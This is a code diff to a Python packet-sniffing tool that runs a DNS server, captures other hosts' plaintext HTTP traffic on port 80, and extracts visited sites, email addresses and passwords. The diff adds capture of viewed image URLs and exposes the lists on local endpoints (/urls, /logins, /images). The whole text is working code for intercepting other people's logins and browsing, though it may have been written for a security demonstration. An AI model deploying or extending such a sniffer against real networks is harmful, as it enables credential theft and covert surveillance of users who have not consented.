@@ -19,6 +19,7 @@ server = DNSServer(resolver,port=53,address='',logger=logger)
 
 urls = []
 logins = []
+images = []
 log = open('log', 'a')
 
 def match_password(payload):
@@ -52,8 +53,19 @@ def match_dns(payload):
     host = re.search('Host: ([a-zA-Z0-9.-]*)\r\n', str(payload))
 
     if host:
-        result.append("Site: " + host.group(1))
+        result.append(host.group(1))
         log.write("Site: " + host.group(1))
+    return result
+
+
+def match_image_path(payload):
+    result = []
+    
+    dns = match_dns(payload)
+    if dns:
+        m = re.search('([A-Z]+) (.+?\.(png|jpg)) HTTP/1\.[01]\r\n', str(payload))
+        if m:
+            result.append("http://"+dns[0]+m.group(2))
     return result
 
 
@@ -69,20 +81,21 @@ def pkt_callback(pkt):
     ip = pkt.getlayer('IP')
 
     if ip and tcp:
-               if tcp.dport == 80 and ip.src != '127.0.0.1':
-                   global urls
-                   global logins
-                   urls = annotate(ip.src, match_dns(tcp.payload)) + urls
+        if tcp.dport == 80 and ip.src != '127.0.0.1':
+            global urls
+            global logins
+            global images
+            urls = annotate(ip.src, match_dns(tcp.payload)) + urls
 
-                   logins = annotate(ip.src, match_email(tcp.payload)) + logins
-                   logins = annotate(ip.src, match_password(tcp.payload)) + logins
+            logins = annotate(ip.src, match_email(tcp.payload)) + logins
+            logins = annotate(ip.src, match_password(tcp.payload)) + logins
+            images = match_image_path(tcp.payload) + images
 
-                   if len(urls) > 100: 
-                       urls = urls[:100]
-                   if len(logins) > 100: 
-                       logins = logins[:100]
-                   print "80 tcp", urls, logins
-
+            if len(urls) > 100: 
+                urls = urls[:100]
+            if len(logins) > 100: 
+                logins = logins[:100]
+            print "80 tcp", urls, logins
 
 class HTTPHandler(BaseHTTPRequestHandler):
     def _set_headers(self):
@@ -102,6 +115,8 @@ class HTTPHandler(BaseHTTPRequestHandler):
            self.wfile.write(json.dumps(list(reversed(sorted(list(set(urls)))))))
         elif self.path == '/logins':
            self.wfile.write(json.dumps(list(reversed(sorted(list(set(logins)))))))
+        elif self.path == '/images':
+           self.wfile.write(json.dumps(list(reversed(sorted(list(set(images)))))))
         else:
            print "error", self.path
 
